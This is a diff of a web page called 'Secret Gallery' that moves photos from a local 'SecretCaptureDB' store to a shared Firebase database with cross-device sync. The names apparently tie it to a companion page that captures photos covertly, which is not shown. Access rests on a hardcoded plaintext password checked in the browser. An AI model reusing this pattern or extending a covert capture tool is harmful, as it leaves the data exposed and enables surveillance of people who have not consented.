@@ -3,8 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📸 Gallery Rahasia</title>
+<title>📸 Gallery Rahasia (Firebase Sync)</title>
     <link rel="stylesheet" href="style.css">
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
+    <script src="firebase-config.js"></script>
 </head>
 <body>
     <div class="container">
@@ -29,36 +33,17 @@
         const PASSWORD = 'admin0123';
         let photos = [];
         
-        // DB sama dengan capture
-        let db;
-        async function initDB() {
-            return new Promise((resolve, reject) => {
-                const request = indexedDB.open('SecretCaptureDB', 1);
-                request.onerror = () => reject(request.error);
-                request.onsuccess = () => {
-                    db = request.result;
-                    resolve();
-                };
-                request.onupgradeneeded = (e) => {
-                    e.target.result.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
-                };
-            });
-        }
+        // Firebase init
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref('photos');
         
-        async function loadGalleryPhotos() {
-            try {
-                await initDB();
-                const transaction = db.transaction(['photos'], 'readonly');
-                const store = transaction.objectStore('photos');
-                const request = store.getAll();
-                
-                request.onsuccess = () => {
-                    photos = request.result.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
-                    renderGallery();
-                };
-            } catch (e) {
-                console.error('Gallery load error:', e);
-            }
+        // Load & auto-sync
+        function loadGalleryPhotos() {
+            db.on('value', (snapshot) => {
+                const data = snapshot.val();
+                photos = data ? Object.values(data).sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp)) : [];
+                renderGallery();
+            });
         }
         
         function renderGallery() {
@@ -95,11 +80,8 @@
         }
         
         async function clearGalleryPhotos() {
-            if (!confirm('Hapus semua foto?')) return;
-            
-            const transaction = db.transaction(['photos'], 'readwrite');
-            const store = transaction.objectStore('photos');
-            store.clear();
+            if (!confirm('Hapus semua foto di semua device?')) return;
+            db.remove();
             photos = [];
             renderGallery();
         }
@@ -115,8 +97,8 @@
                 if (passwordInput.value === PASSWORD) {
                     loginContainer.classList.add('hidden');
                     galleryContainer.classList.remove('hidden');
-                    await loadGalleryPhotos();
-                    document.getElementById('refresh').onclick = loadGalleryPhotos;
+                    loadGalleryPhotos();
+                    document.getElementById('refresh').onclick = () => loadGalleryPhotos();
                     document.getElementById('clearAll').onclick = clearGalleryPhotos;
                 } else {
                     loginError.classList.remove('hidden');
